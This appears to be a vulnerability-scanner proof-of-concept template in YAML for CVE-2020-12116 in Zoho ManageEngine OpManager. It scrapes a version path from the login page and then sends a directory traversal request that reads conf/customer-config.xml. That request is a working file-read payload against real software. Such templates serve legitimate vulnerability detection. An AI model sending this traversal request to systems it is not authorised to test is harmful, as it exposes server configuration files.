name: poc-yaml-zoho-manageengine-opmanager-cve-2020-12116
binding: a64e5e82-0970-43ef-803a-d8d3f204a099
manual: true
detail:
    author: 2husky
    links:
        - https://github.com/BeetleChunks/CVE-2020-12116
    vulnerability:
        id: CT-14031
        level: high
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /
            follow_redirects: false
        expression: response.status == 200 && 'SRC="/cachestart/'.bmatches(response.body)
        output:
            search: |-
                '<SCRIPT\\sLANGUAGE="javascript"\\sSRC="/(?P<version>.*)jquery-.*"></SCRIPT>'.bsubmatch(response.body)
            version: search["version"]
    r1:
        request:
            cache: true
            method: GET
            path: /{{version}}../../../../conf/customer-config.xml
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("xml") && '\\<configuration\\sname=".*"\\svalue=".*"/\\>'.bmatches(response.body)
expression: r0() && r1()
